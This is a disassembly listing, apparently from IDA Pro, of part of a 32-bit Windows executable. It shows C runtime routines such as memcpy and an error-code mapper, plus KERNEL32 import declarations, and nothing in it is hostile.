.text:00404A49                 jnz     short loc_404A7B
.text:00404A4B                 push    1
.text:00404A4D                 lea     ebx, [eax+1]
.text:00404A50                 pop     esi
.text:00404A51
.text:00404A51 loc_404A51:                             ; CODE XREF: sub_4049F0+68j
.text:00404A51                 cmp     byte ptr [ebx], 0
.text:00404A54                 jnz     short loc_404A5A
.text:00404A56                 inc     ebx
.text:00404A57                 inc     esi
.text:00404A58                 jmp     short loc_404A51
.text:00404A5A ; ---------------------------------------------------------------------------
.text:00404A5A
.text:00404A5A loc_404A5A:                             ; CODE XREF: sub_4049F0+64j
.text:00404A5A                 cmp     esi, edx
.text:00404A5C                 jnb     short loc_404AAC
.text:00404A5E                 cmp     eax, [ebp+var_4]
.text:00404A61                 jnz     short loc_404A68
.text:00404A63                 mov     [ecx+4], esi
.text:00404A66                 jmp     short loc_404A74
.text:00404A68 ; ---------------------------------------------------------------------------
.text:00404A68
.text:00404A68 loc_404A68:                             ; CODE XREF: sub_4049F0+71j
.text:00404A68                 sub     [ebp+arg_4], esi
.text:00404A6B                 cmp     [ebp+arg_4], edx
.text:00404A6E                 jb      loc_404B0D
.text:00404A74
.text:00404A74 loc_404A74:                             ; CODE XREF: sub_4049F0+76j
.text:00404A74                 mov     edi, [ebp+var_4]
.text:00404A77                 mov     eax, ebx
.text:00404A79                 jmp     short loc_404A80
.text:00404A7B ; ---------------------------------------------------------------------------
.text:00404A7B
.text:00404A7B loc_404A7B:                             ; CODE XREF: sub_4049F0+59j
.text:00404A7B                 movzx   esi, bl
.text:00404A7E                 add     eax, esi
.text:00404A80
.text:00404A80 loc_404A80:                             ; CODE XREF: sub_4049F0+89j
.text:00404A80                 lea     esi, [eax+edx]
.text:00404A83                 cmp     esi, [ebp+arg_0]
.text:00404A86                 jb      short loc_404A45
.text:00404A88
.text:00404A88 loc_404A88:                             ; CODE XREF: sub_4049F0+53j
.text:00404A88                 lea     esi, [ecx+8]
.text:00404A8B
.text:00404A8B loc_404A8B:                             ; CODE XREF: sub_4049F0+EBj
.text:00404A8B                                         ; sub_4049F0+F2j
.text:00404A8B                 cmp     esi, edi
.text:00404A8D                 jnb     short loc_404B0D
.text:00404A8F                 lea     eax, [esi+edx]
.text:00404A92                 cmp     eax, [ebp+arg_0]
.text:00404A95                 jnb     short loc_404B0D
.text:00404A97                 mov     al, [esi]
.text:00404A99                 test    al, al
.text:00404A9B                 jnz     short loc_404ADD
.text:00404A9D                 push    1
.text:00404A9F                 lea     ebx, [esi+1]
.text:00404AA2                 pop     eax
.text:00404AA3
.text:00404AA3 loc_404AA3:                             ; CODE XREF: sub_4049F0+BAj
.text:00404AA3                 cmp     byte ptr [ebx], 0
.text:00404AA6                 jnz     short loc_404ACD
.text:00404AA8                 inc     ebx
.text:00404AA9                 inc     eax
.text:00404AAA                 jmp     short loc_404AA3
.text:00404AAC ; ---------------------------------------------------------------------------
.text:00404AAC
.text:00404AAC loc_404AAC:                             ; CODE XREF: sub_4049F0+6Cj
.text:00404AAC                 lea     ebx, [eax+edx]
.text:00404AAF                 cmp     ebx, [ebp+arg_0]
.text:00404AB2                 jnb     short loc_404ABD
.text:00404AB4                 sub     esi, edx
.text:00404AB6                 mov     [ecx], ebx
.text:00404AB8                 mov     [ecx+4], esi
.text:00404ABB                 jmp     short loc_404AC6
.text:00404ABD ; ---------------------------------------------------------------------------
.text:00404ABD
.text:00404ABD loc_404ABD:                             ; CODE XREF: sub_4049F0+C2j
.text:00404ABD                 and     dword ptr [ecx+4], 0
.text:00404AC1                 lea     esi, [ecx+8]
.text:00404AC4                 mov     [ecx], esi
.text:00404AC6
.text:00404AC6 loc_404AC6:                             ; CODE XREF: sub_4049F0+CBj
.text:00404AC6                 mov     [eax], dl
.text:00404AC8                 add     eax, 8
.text:00404ACB                 jmp     short loc_404B03
.text:00404ACD ; ---------------------------------------------------------------------------
.text:00404ACD
.text:00404ACD loc_404ACD:                             ; CODE XREF: sub_4049F0+B6j
.text:00404ACD                 cmp     eax, edx
.text:00404ACF                 jnb     short loc_404AE4
.text:00404AD1                 sub     [ebp+arg_4], eax
.text:00404AD4                 cmp     [ebp+arg_4], edx
.text:00404AD7                 jb      short loc_404B0D
.text:00404AD9                 mov     esi, ebx
.text:00404ADB                 jmp     short loc_404A8B
.text:00404ADD ; ---------------------------------------------------------------------------
.text:00404ADD
.text:00404ADD loc_404ADD:                             ; CODE XREF: sub_4049F0+ABj
.text:00404ADD                 movzx   eax, al
.text:00404AE0                 add     esi, eax
.text:00404AE2                 jmp     short loc_404A8B
.text:00404AE4 ; ---------------------------------------------------------------------------
.text:00404AE4
.text:00404AE4 loc_404AE4:                             ; CODE XREF: sub_4049F0+DFj
.text:00404AE4                 lea     ebx, [esi+edx]
.text:00404AE7                 cmp     ebx, [ebp+arg_0]
.text:00404AEA                 jnb     short loc_404AF5
.text:00404AEC                 sub     eax, edx
.text:00404AEE                 mov     [ecx], ebx
.text:00404AF0                 mov     [ecx+4], eax
.text:00404AF3                 jmp     short loc_404AFE
.text:00404AF5 ; ---------------------------------------------------------------------------
.text:00404AF5
.text:00404AF5 loc_404AF5:                             ; CODE XREF: sub_4049F0+FAj
.text:00404AF5                 and     dword ptr [ecx+4], 0
.text:00404AF9                 lea     eax, [ecx+8]
.text:00404AFC                 mov     [ecx], eax
.text:00404AFE
.text:00404AFE loc_404AFE:                             ; CODE XREF: sub_4049F0+103j
.text:00404AFE                 mov     [esi], dl
.text:00404B00                 lea     eax, [esi+8]
.text:00404B03
.text:00404B03 loc_404B03:                             ; CODE XREF: sub_4049F0+40j
.text:00404B03                                         ; sub_4049F0+DBj
.text:00404B03                 imul    ecx, 0Fh
.text:00404B06                 shl     eax, 4
.text:00404B09                 sub     eax, ecx
.text:00404B0B                 jmp     short loc_404B0F
.text:00404B0D ; ---------------------------------------------------------------------------
.text:00404B0D
.text:00404B0D loc_404B0D:                             ; CODE XREF: sub_4049F0+7Ej
.text:00404B0D                                         ; sub_4049F0+9Dj ...
.text:00404B0D                 xor     eax, eax
.text:00404B0F
.text:00404B0F loc_404B0F:                             ; CODE XREF: sub_4049F0+11Bj
.text:00404B0F                 pop     edi
.text:00404B10                 pop     esi
.text:00404B11                 pop     ebx
.text:00404B12                 leave
.text:00404B13                 retn
.text:00404B13 sub_4049F0      endp
.text:00404B13
.text:00404B14 ; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
.text:00404B9D                 align 10h
.text:00404BA0 ; [000000FE BYTES: COLLAPSED FUNCTION _strncpy. PRESS KEYPAD "+" TO EXPAND]
.text:00404C9E ; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS KEYPAD "+" TO EXPAND]
.text:00404CB9 ; [00000057 BYTES: COLLAPSED FUNCTION __commit. PRESS KEYPAD "+" TO EXPAND]
.text:00404D10 ; [000001AD BYTES: COLLAPSED FUNCTION __write. PRESS KEYPAD "+" TO EXPAND]
.text:00404EBD ; [00000009 BYTES: COLLAPSED FUNCTION __fptrap. PRESS KEYPAD "+" TO EXPAND]
.text:00404EC6 ; [0000009A BYTES: COLLAPSED FUNCTION __lseek. PRESS KEYPAD "+" TO EXPAND]
.text:00404F60 ; [00000044 BYTES: COLLAPSED FUNCTION __getbuf. PRESS KEYPAD "+" TO EXPAND]
.text:00404FA4                 align 10h
.text:00404FB0 ; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+" TO EXPAND]
.text:00405008 ; [00000056 BYTES: COLLAPSED FUNCTION _fclose. PRESS KEYPAD "+" TO EXPAND]
.text:0040505E ; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS KEYPAD "+" TO EXPAND]
.text:00405282 ; [0000002B BYTES: COLLAPSED FUNCTION _strncnt. PRESS KEYPAD "+" TO EXPAND]
.text:004052AD ; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO EXPAND]
.text:004053F6 ; [000000CC BYTES: COLLAPSED FUNCTION _toupper. PRESS KEYPAD "+" TO EXPAND]
.text:004054C2 ; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS KEYPAD "+" TO EXPAND]
.text:00405537                 align 10h
.text:00405540
.text:00405540 ; void *__cdecl memcpy_0(void *,const void *,size_t)
.text:00405540 _memcpy_0:                              ; CODE XREF: sub_403D12+2EFp
.text:00405540                 push    ebp
.text:00405541                 mov     ebp, esp
.text:00405543                 push    edi
.text:00405544                 push    esi
.text:00405545                 mov     esi, [ebp+0Ch]
.text:00405548                 mov     ecx, [ebp+10h]
.text:0040554B                 mov     edi, [ebp+8]
.text:0040554E                 mov     eax, ecx
.text:00405550                 mov     edx, ecx
.text:00405552                 add     eax, esi
.text:00405554                 cmp     edi, esi
.text:00405556                 jbe     short loc_405560
.text:00405558                 cmp     edi, eax
.text:0040555A                 jb      loc_4056D8
.text:00405560
.text:00405560 loc_405560:                             ; CODE XREF: .text:00405556j
.text:00405560                 test    edi, 3
.text:00405566                 jnz     short loc_40557C
.text:00405568                 shr     ecx, 2
.text:0040556B                 and     edx, 3
.text:0040556E                 cmp     ecx, 8
.text:00405571                 jb      short near ptr dword_40559C
.text:00405573                 rep movsd
.text:00405575                 jmp     ds:off_405688[edx*4]
.text:0040557C ; ---------------------------------------------------------------------------
.text:0040557C
.text:0040557C loc_40557C:                             ; CODE XREF: .text:00405566j
.text:0040557C                 mov     eax, edi
.text:0040557E                 mov     edx, 3
.text:00405583                 sub     ecx, 4
.text:00405586                 jb      short loc_405594
.text:00405588                 and     eax, 3
.text:0040558B                 add     ecx, eax
.text:0040558D                 jmp     ds:dword_4055A0[eax*4]
.text:00405594 ; ---------------------------------------------------------------------------
.text:00405594
.text:00405594 loc_405594:                             ; CODE XREF: .text:00405586j
.text:00405594                 jmp     ds:TrailUp0_0[ecx*4]
.text:00405594 ; ---------------------------------------------------------------------------
.text:0040559B                 align 4
.text:0040559C dword_40559C    dd 1C8D24FFh            ; CODE XREF: .text:00405571j
.text:004055A0 dword_4055A0    dd 90004056h            ; DATA XREF: .text:0040558Dr
.text:004055A4                 dd offset dword_4055B0
.text:004055A8                 dd offset LeadUp2_0
.text:004055AC                 dd offset LeadUp3_0
.text:004055B0 dword_4055B0    dd 68AD123h, 468A0788h, 1478801h, 0C102468Ah, 478802E9h
.text:004055B0                                         ; DATA XREF: .text:004055A4o
.text:004055B0                 dd 3C68302h, 8303C783h, 0CC7208F9h, 24FFA5F3h, 40568895h
.text:004055B0                 dd 498D00h
.text:004055DC LeadUp2_0       dd 68AD123h, 468A0788h, 2E9C101h, 83014788h, 0C78302C6h
.text:004055DC                                         ; DATA XREF: .text:004055A8o
.text:004055DC                 dd 8F98302h, 0A5F3A672h, 889524FFh, 90004056h
.text:00405600 LeadUp3_0       dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
.text:00405600                                         ; DATA XREF: .text:004055ACo
.text:00405600                 dd 40568895h, 498D00h, 40567Fh, 40566Ch, 405664h, 40565Ch
.text:00405600                 dd 405654h, 40564Ch, 405644h, 40563Ch
.text:0040563C ; ---------------------------------------------------------------------------
.text:0040563C
.text:0040563C UnwindUp7_0:
.text:0040563C                 mov     eax, [esi+ecx*4-1Ch]
.text:00405640                 mov     [edi+ecx*4-1Ch], eax
.text:00405644
.text:00405644 UnwindUp6_0:
.text:00405644                 mov     eax, [esi+ecx*4-18h]
.text:00405648                 mov     [edi+ecx*4-18h], eax
.text:0040564C
.text:0040564C UnwindUp5_0:
.text:0040564C                 mov     eax, [esi+ecx*4-14h]
.text:00405650                 mov     [edi+ecx*4-14h], eax
.text:00405654
.text:00405654 UnwindUp4_0:
.text:00405654                 mov     eax, [esi+ecx*4-10h]
.text:00405658                 mov     [edi+ecx*4-10h], eax
.text:0040565C
.text:0040565C UnwindUp3_0:
.text:0040565C                 mov     eax, [esi+ecx*4-0Ch]
.text:00405660                 mov     [edi+ecx*4-0Ch], eax
.text:00405664
.text:00405664 UnwindUp2_0:
.text:00405664                 mov     eax, [esi+ecx*4-8]
.text:00405668                 mov     [edi+ecx*4-8], eax
.text:0040566C
.text:0040566C UnwindUp1_0:
.text:0040566C                 mov     eax, [esi+ecx*4-4]
.text:00405670                 mov     [edi+ecx*4-4], eax
.text:00405674                 lea     eax, ds:0[ecx*4]
.text:0040567B                 add     esi, eax
.text:0040567D                 add     edi, eax
.text:0040567F
.text:0040567F UnwindUp0_0:
.text:0040567F                 jmp     ds:off_405688[edx*4]
.text:0040567F ; ---------------------------------------------------------------------------
.text:00405686                 align 4
.text:00405688 off_405688      dd offset TrailUp0_0    ; DATA XREF: .text:00405575r
.text:00405688                                         ; .text:UnwindUp0_0r
.text:0040568C                 dd offset TrailUp1_0
.text:00405690                 dd offset TrailUp2_0
.text:00405694                 dd offset TrailUp3_0
.text:00405698 TrailUp0_0      dd 5E08458Bh            ; CODE XREF: .text:00405575j
.text:00405698                                         ; DATA XREF: .text:loc_405594r ...
.text:0040569C ; ---------------------------------------------------------------------------
.text:0040569C                 pop     edi
.text:0040569D                 leave
.text:0040569E                 retn
.text:0040569E ; ---------------------------------------------------------------------------
.text:0040569F                 align 10h
.text:004056A0 ; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1_0. PRESS KEYPAD "+" TO EXPAND]
.text:004056AB                 align 4
.text:004056AC ; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2_0. PRESS KEYPAD "+" TO EXPAND]
.text:004056BD                 align 10h
.text:004056C0 ; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3_0. PRESS KEYPAD "+" TO EXPAND]
.text:004056D7                 align 4
.text:004056D8
.text:004056D8 loc_4056D8:                             ; CODE XREF: .text:0040555Aj
.text:004056D8                 lea     esi, [ecx+esi-4]
.text:004056DC                 lea     edi, [ecx+edi-4]
.text:004056E0                 test    edi, 3
.text:004056E6                 jnz     short loc_40570C
.text:004056E8                 shr     ecx, 2
.text:004056EB                 and     edx, 3
.text:004056EE                 cmp     ecx, 8
.text:004056F1                 jb      short loc_405700
.text:004056F3                 std
.text:004056F4                 rep movsd
.text:004056F6                 cld
.text:004056F7                 jmp     ds:off_405820[edx*4]
.text:004056F7 ; ---------------------------------------------------------------------------
.text:004056FE                 align 10h
.text:00405700
.text:00405700 loc_405700:                             ; CODE XREF: .text:004056F1j
.text:00405700                                         ; .text:00405748j ...
.text:00405700                 neg     ecx
.text:00405702                 jmp     ds:off_4057D0[ecx*4]
.text:00405702 ; ---------------------------------------------------------------------------
.text:00405709                 align 4
.text:0040570C
.text:0040570C loc_40570C:                             ; CODE XREF: .text:004056E6j
.text:0040570C                 mov     eax, edi
.text:0040570E                 mov     edx, 3
.text:00405713                 cmp     ecx, 4
.text:00405716                 jb      short near ptr dword_405724
.text:00405718                 and     eax, 3
.text:0040571B                 sub     ecx, eax
.text:0040571D                 jmp     ds:dword_405728[eax*4]
.text:0040571D ; ---------------------------------------------------------------------------
.text:00405724 dword_405724    dd 208D24FFh            ; CODE XREF: .text:00405716j
.text:00405728 dword_405728    dd 90004058h            ; DATA XREF: .text:0040571Dr
.text:0040572C                 dd offset loc_405738
.text:00405730                 dd offset LeadDown2_0
.text:00405734 ; ---------------------------------------------------------------------------
.text:00405734                 adc     byte ptr [edi+40h], 0
.text:00405738
.text:00405738 loc_405738:                             ; DATA XREF: .text:0040572Co
.text:00405738                 mov     al, [esi+3]
.text:0040573B                 and     edx, ecx
.text:0040573D                 mov     [edi+3], al
.text:00405740                 dec     esi
.text:00405741                 shr     ecx, 2
.text:00405744                 dec     edi
.text:00405745                 cmp     ecx, 8
.text:00405748                 jb      short loc_405700
.text:0040574A                 std
.text:0040574B                 rep movsd
.text:0040574D                 cld
.text:0040574E                 jmp     ds:off_405820[edx*4]
.text:0040574E ; ---------------------------------------------------------------------------
.text:00405755                 align 4
.text:00405758
.text:00405758 LeadDown2_0:                            ; DATA XREF: .text:00405730o
.text:00405758                 mov     al, [esi+3]
.text:0040575B                 and     edx, ecx
.text:0040575D                 mov     [edi+3], al
.text:00405760                 mov     al, [esi+2]
.text:00405763                 shr     ecx, 2
.text:00405766                 mov     [edi+2], al
.text:00405769                 sub     esi, 2
.text:0040576C                 sub     edi, 2
.text:0040576F                 cmp     ecx, 8
.text:00405772                 jb      short loc_405700
.text:00405774                 std
.text:00405775                 rep movsd
.text:00405777                 cld
.text:00405778                 jmp     ds:off_405820[edx*4]
.text:00405778 ; ---------------------------------------------------------------------------
.text:0040577F                 align 10h
.text:00405780
.text:00405780 LeadDown3_0:
.text:00405780                 mov     al, [esi+3]
.text:00405783                 and     edx, ecx
.text:00405785                 mov     [edi+3], al
.text:00405788                 mov     al, [esi+2]
.text:0040578B                 mov     [edi+2], al
.text:0040578E                 mov     al, [esi+1]
.text:00405791                 shr     ecx, 2
.text:00405794                 mov     [edi+1], al
.text:00405797                 sub     esi, 3
.text:0040579A                 sub     edi, 3
.text:0040579D                 cmp     ecx, 8
.text:004057A0                 jb      loc_405700
.text:004057A6                 std
.text:004057A7                 rep movsd
.text:004057A9                 cld
.text:004057AA                 jmp     ds:off_405820[edx*4]
.text:004057AA ; ---------------------------------------------------------------------------
.text:004057B1                 align 4
.text:004057B4                 dd offset UnwindDown7_0
.text:004057B8                 dd offset UnwindDown6_0
.text:004057BC                 dd offset UnwindDown5_0
.text:004057C0                 dd offset UnwindDown4_0
.text:004057C4                 dd offset UnwindDown3_0
.text:004057C8                 dd offset UnwindDown2_0
.text:004057CC                 dd offset UnwindDown1_0
.text:004057D0 off_4057D0      dd offset UnwindDown0_0 ; DATA XREF: .text:00405702r
.text:004057D4 ; ---------------------------------------------------------------------------
.text:004057D4
.text:004057D4 UnwindDown7_0:                          ; DATA XREF: .text:004057B4o
.text:004057D4                 mov     eax, [esi+ecx*4+1Ch]
.text:004057D8                 mov     [edi+ecx*4+1Ch], eax
.text:004057DC
.text:004057DC UnwindDown6_0:                          ; DATA XREF: .text:004057B8o
.text:004057DC                 mov     eax, [esi+ecx*4+18h]
.text:004057E0                 mov     [edi+ecx*4+18h], eax
.text:004057E4
.text:004057E4 UnwindDown5_0:                          ; DATA XREF: .text:004057BCo
.text:004057E4                 mov     eax, [esi+ecx*4+14h]
.text:004057E8                 mov     [edi+ecx*4+14h], eax
.text:004057EC
.text:004057EC UnwindDown4_0:                          ; DATA XREF: .text:004057C0o
.text:004057EC                 mov     eax, [esi+ecx*4+10h]
.text:004057F0                 mov     [edi+ecx*4+10h], eax
.text:004057F4
.text:004057F4 UnwindDown3_0:                          ; DATA XREF: .text:004057C4o
.text:004057F4                 mov     eax, [esi+ecx*4+0Ch]
.text:004057F8                 mov     [edi+ecx*4+0Ch], eax
.text:004057FC
.text:004057FC UnwindDown2_0:                          ; DATA XREF: .text:004057C8o
.text:004057FC                 mov     eax, [esi+ecx*4+8]
.text:00405800                 mov     [edi+ecx*4+8], eax
.text:00405804
.text:00405804 UnwindDown1_0:                          ; DATA XREF: .text:004057CCo
.text:00405804                 mov     eax, [esi+ecx*4+4]
.text:00405808                 mov     [edi+ecx*4+4], eax
.text:0040580C                 lea     eax, ds:0[ecx*4]
.text:00405813                 add     esi, eax
.text:00405815                 add     edi, eax
.text:00405817 ; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0_0. PRESS KEYPAD "+" TO EXPAND]
.text:00405875 ; [0000007A BYTES: COLLAPSED FUNCTION __free_osfhnd. PRESS KEYPAD "+" TO EXPAND]
.text:004058EF ; [0000003D BYTES: COLLAPSED FUNCTION __get_osfhandle. PRESS KEYPAD "+" TO EXPAND]
.text:0040592C
.text:0040592C ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:0040592C
.text:0040592C
.text:0040592C sub_40592C      proc near               ; CODE XREF: __write+160p
.text:0040592C                                         ; __lseek+6Bp ...
.text:0040592C
.text:0040592C arg_0           = dword ptr  4
.text:0040592C
.text:0040592C                 mov     ecx, [esp+arg_0]
.text:00405930                 xor     edx, edx
.text:00405932                 mov     dword_4099F4, ecx
.text:00405938                 mov     eax, offset unk_409870
.text:0040593D
.text:0040593D loc_40593D:                             ; CODE XREF: sub_40592C+1Ej
.text:0040593D                 cmp     ecx, [eax]
.text:0040593F                 jz      short loc_405961
.text:00405941                 add     eax, 8
.text:00405944                 inc     edx
.text:00405945                 cmp     eax, offset dword_4099D8
.text:0040594A                 jb      short loc_40593D
.text:0040594C                 cmp     ecx, 13h
.text:0040594F                 jb      short loc_40596E
.text:00405951                 cmp     ecx, 24h
.text:00405954                 ja      short loc_40596E
.text:00405956                 mov     dword_4099F0, 0Dh
.text:00405960                 retn
.text:00405961 ; ---------------------------------------------------------------------------
.text:00405961
.text:00405961 loc_405961:                             ; CODE XREF: sub_40592C+13j
.text:00405961                 mov     eax, dword_409874[edx*8]
.text:00405968                 mov     dword_4099F0, eax
.text:0040596D                 retn
.text:0040596E ; ---------------------------------------------------------------------------
.text:0040596E
.text:0040596E loc_40596E:                             ; CODE XREF: sub_40592C+23j
.text:0040596E                                         ; sub_40592C+28j
.text:0040596E                 cmp     ecx, 0BCh
.text:00405974                 jb      short loc_405988
.text:00405976                 cmp     ecx, 0CAh
.text:0040597C                 mov     dword_4099F0, 8
.text:00405986                 jbe     short locret_405992
.text:00405988
.text:00405988 loc_405988:                             ; CODE XREF: sub_40592C+48j
.text:00405988                 mov     dword_4099F0, 16h
.text:00405992
.text:00405992 locret_405992:                          ; CODE XREF: sub_40592C+5Aj
.text:00405992                 retn
.text:00405992 sub_40592C      endp
.text:00405992
.text:00405993 ; [000000B3 BYTES: COLLAPSED FUNCTION __close. PRESS KEYPAD "+" TO EXPAND]
.text:00405A46 ; [0000002B BYTES: COLLAPSED FUNCTION __freebuf. PRESS KEYPAD "+" TO EXPAND]
.text:00405A71                 align 2
.text:00405A72 ; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
.text:00405A78                 align 800h
.text:00405A78 _text           ends
.text:00405A78
.idata:00406000 ; Section 2. (virtual address 00006000)
.idata:00406000 ; Virtual size                  : 0000095E (   2398.)
.idata:00406000 ; Section size in file          : 00001000 (   4096.)
.idata:00406000 ; Offset to raw data for section: 00006000
.idata:00406000 ; Flags 40000040: Data Readable
.idata:00406000 ; Alignment     : default
.idata:00406000 ;
.idata:00406000 ; Imports from KERNEL32.dll
.idata:00406000 ;
.idata:00406000 ; ---------------------------------------------------------------------------
.idata:00406000
.idata:00406000 ; Segment type: Externs
.idata:00406000 ; _idata
.idata:00406000 ; void __stdcall Sleep(DWORD dwMilliseconds)
.idata:00406000                 extrn Sleep:dword       ; DATA XREF: _main+43r
.idata:00406004 ; BOOL __stdcall SetStdHandle(DWORD nStdHandle,HANDLE hHandle)
.idata:00406004                 extrn SetStdHandle:dword
.idata:00406004                                         ; DATA XREF: __free_osfhnd:loc_4058C8r
.idata:00406008 ; BOOL __stdcall GetStringTypeW(DWORD dwInfoType,LPCWSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
.idata:00406008                 extrn GetStringTypeW:dword
.idata:00406008                                         ; DATA XREF: ___crtGetStringTypeA+3Fr
.idata:00406008                                         ; ___crtGetStringTypeA+12Dr
.idata:0040600C ; BOOL __stdcall GetStringTypeA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
.idata:0040600C                 extrn GetStringTypeA:dword
.idata:0040600C                                         ; DATA XREF: ___crtGetStringTypeA+59r
.idata:0040600C                                         ; ___crtGetStringTypeA+8Dr
.idata:00406010 ; int __stdcall LCMapStringW(LCID Locale,DWORD dwMapFlags,LPCWSTR lpSrcStr,int cchSrc,LPWSTR lpDestStr,int cchDest)
.idata:00406010                 extrn LCMapStringW:dword ; DATA XREF: ___crtLCMapStringA+42r
.idata:00406010                                         ; ___crtLCMapStringA+14Dr ...
.idata:00406014 ; int __stdcall LCMapStringA(LCID Locale,DWORD dwMapFlags,LPCSTR lpSrcStr,int cchSrc,LPSTR lpDestStr,int cchDest)
.idata:00406014                 extrn LCMapStringA:dword ; DATA XREF: ___crtLCMapStringA+5Er
.idata:00406014                                         ; ___crtLCMapStringA+A7r
.idata:00406018 ; int __stdcall MultiByteToWideChar(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cchMultiByte,LPWSTR lpWideCharStr,int cchWideChar)
.idata:00406018                 extrn MultiByteToWideChar:dword
.idata:00406018                                         ; DATA XREF: ___crtLCMapStringA+DFr
.idata:00406018                                         ; ___crtLCMapStringA+137r ...
.idata:0040601C ; LPSTR GetCommandLineA(void)
.idata:0040601C                 extrn GetCommandLineA:dword ; DATA XREF: start+74r
.idata:00406020 ; DWORD GetVersion(void)
.idata:00406020                 extrn GetVersion:dword  ; DATA XREF: start+26r
.idata:00406020                                         ; Get current version number of Windows
.idata:00406020                                         ; and information about the operating system platform
.idata:00406024 ; void __stdcall ExitProcess(UINT uExitCode)
.idata:00406024                 extrn ExitProcess:dword ; DATA XREF: _fast_error_exit+1Dr
.idata:00406024                                         ; _doexit+91r
.idata:00406028 ; BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)
.idata:00406028                 extrn TerminateProcess:dword ; DATA XREF: _doexit+17r
.idata:0040602C ; HANDLE GetCurrentProcess(void)
.idata:0040602C                 extrn GetCurrentProcess:dword ; DATA XREF: _doexit+10r
.idata:00406030 ; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
.idata:00406030                 extrn UnhandledExceptionFilter:dword
.idata:00406030                                         ; DATA XREF: __XcptFilter+138r
.idata:00406034 ; DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
.idata:00406034                 extrn GetModuleFileNameA:dword ; DATA XREF: __setargv+23r
.idata:00406034                                         ; sub_402558+B4r ...
.idata:00406038 ; BOOL __stdcall FreeEnvironmentStringsA(LPSTR)
.idata:00406038                 extrn FreeEnvironmentStringsA:dword
.idata:00406038                                         ; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
.idata:0040603C ; BOOL __stdcall FreeEnvironmentStringsW(LPWSTR)
.idata:0040603C                 extrn FreeEnvironmentStringsW:dword
.idata:0040603C                                         ; DATA XREF: ___crtGetEnvironmentStringsA+CEr
.idata:00406040 ; int __stdcall WideCharToMultiByte(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL lpUsedDefaultChar)
.idata:00406040                 extrn WideCharToMultiByte:dword
.idata:00406040                                         ; DATA XREF: ___crtGetEnvironmentStringsA+7Er
.idata:00406040                                         ; ___crtGetEnvironmentStringsA+93r ...
.idata:00406044 ; LPSTR GetEnvironmentStrings(void)
.idata:00406044                 extrn GetEnvironmentStrings:dword
.idata:00406044                                         ; DATA XREF: ___crtGetEnvironmentStringsA:loc_40227Dr
.idata:00406044                                         ; ___crtGetEnvironmentStringsA+E1r
.idata:00406048 ; LPWSTR GetEnvironmentStringsW(void)
.idata:00406048                 extrn GetEnvironmentStringsW:dword
.idata:00406048                                         ; DATA XREF: ___crtGetEnvironmentStringsA+9r
.idata:00406048                                         ; ___crtGetEnvironmentStringsA+1Br ...
.idata:0040604C ; UINT __stdcall SetHandleCount(UINT uNumber)
.idata:0040604C                 extrn SetHandleCount:dword ; DATA XREF: __ioinit+19Dr
.idata:00406050 ; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
.idata:00406050                 extrn GetStdHandle:dword ; DATA XREF: __ioinit+158r
.idata:00406050                                         ; sub_402909+143r
.idata:00406054 ; DWORD __stdcall GetFileType(HANDLE hFile)
.idata:00406054                 extrn GetFileType:dword ; DATA XREF: __ioinit+FFr
.idata:00406054                                         ; __ioinit+166r
.idata:00406058 ; void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)
.idata:00406058                 extrn GetStartupInfoA:dword ; DATA XREF: __ioinit+59r
.idata:0040605C ; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
.idata:0040605C                 extrn GetModuleHandleA:dword ; DATA XREF: sub_40252B+Ar
.idata:00406060 ; DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName,LPSTR lpBuffer,DWORD nSize)
.idata:00406060                 extrn GetEnvironmentVariableA:dword
.idata:00406060                                         ; DATA XREF: sub_402558+54r
.idata:00406064 ; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)
.idata:00406064                 extrn GetVersionExA:dword ; DATA XREF: sub_402558+1Fr
.idata:00406064                                         ; Get extended information about the
.idata:00406064                                         ; version of the operating system
.idata:00406068 ; BOOL __stdcall HeapDestroy(HANDLE hHeap)
.idata:00406068                 extrn HeapDestroy:dword ; DATA XREF: sub_4026A0+50r
.idata:0040606C ; HANDLE __stdcall HeapCreate(DWORD flOptions,DWORD dwInitialSize,DWORD dwMaximumSize)
.idata:0040606C                 extrn HeapCreate:dword  ; DATA XREF: sub_4026A0+11r
.idata:00406070 ; BOOL __stdcall VirtualFree(LPVOID lpAddress,DWORD dwSize,DWORD dwFreeType)
.idata:00406070                 extrn VirtualFree:dword ; DATA XREF: sub_403D12+240r
.idata:00406070                                         ; sub_403D12+258r ...
.idata:00406074 ; BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
.idata:00406074                 extrn HeapFree:dword    ; DATA XREF: sub_402C41+60r
.idata:00406074                                         ; sub_403D12+2C5r ...
